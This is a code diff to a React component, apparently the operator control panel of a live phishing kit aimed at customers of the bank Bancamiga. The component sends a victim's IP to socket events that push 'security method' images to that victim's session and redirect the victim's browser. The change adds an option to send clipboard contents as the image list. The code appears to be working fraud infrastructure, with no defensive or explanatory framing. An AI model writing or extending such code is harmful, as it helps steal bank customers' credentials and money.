@@ -5,14 +5,19 @@ export const RedirectIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
   
   const [formView, setFormView] = useState(false)
   const [isSelected, setIsSelected] = useState(false)
-
+  const [listPhotoCopy, setListPhotoCopy] = useState(false)
+  
   const {values, handleBlur, handleChange, handleSubmit } = useFormik({
     initialValues: {
       image: ''
     },
-    onSubmit: ({image}) =>{
+    onSubmit: async({image}) =>{
       if(textPage == 'Metodo seguridad' && !isSelected) socket.emit('[bancamiga] getImage', {image, ip})
-      if(textPage == 'Imagen') socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image), ip})
+      if(textPage == 'Imagen') {
+        (isSelected) 
+        ? socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(await navigator.clipboard.readText()), ip}) 
+        : socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image), ip})
+      }
       socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true })
       setFormView(false)
       onClose()
@@ -43,6 +48,13 @@ export const RedirectIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
               textPage == 'Metodo seguridad' ? (
                   <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                     Omitir foto
+                  </Checkbox>
+              ) : null
+            }
+            {
+              textPage == 'Imagen' ? (
+                  <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
+                    Enviar lo copiado
                   </Checkbox>
               ) : null
             }
